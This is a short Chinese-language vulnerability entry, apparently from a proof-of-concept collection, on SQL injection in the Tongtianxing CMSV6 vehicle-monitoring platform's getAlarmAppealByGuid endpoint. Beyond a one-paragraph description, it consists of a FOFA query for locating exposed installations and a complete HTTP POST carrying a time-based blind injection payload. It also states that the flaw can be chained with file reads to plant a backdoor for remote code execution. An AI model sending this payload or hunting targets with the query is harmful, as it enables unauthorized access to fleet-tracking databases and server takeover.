# 通天星CMSV6车载定位监控平台getAlarmAppealByGuid存在SQL注入漏洞

该漏洞是由于通天星CMSV6车载定位监控平台 /alarm_appeal/getAlarmAppealByGuid 接口处未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。该漏洞可配合任意文件读取获取网站绝对路径写入后门文件进行远程代码执行。

## fofa

```java
body="/808gps/"
```

## poc

```java
POST /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Encoding: gzip, deflate
 
guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP(5)))PITq) AND ('qhqF'='qhqF
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408282321708.png)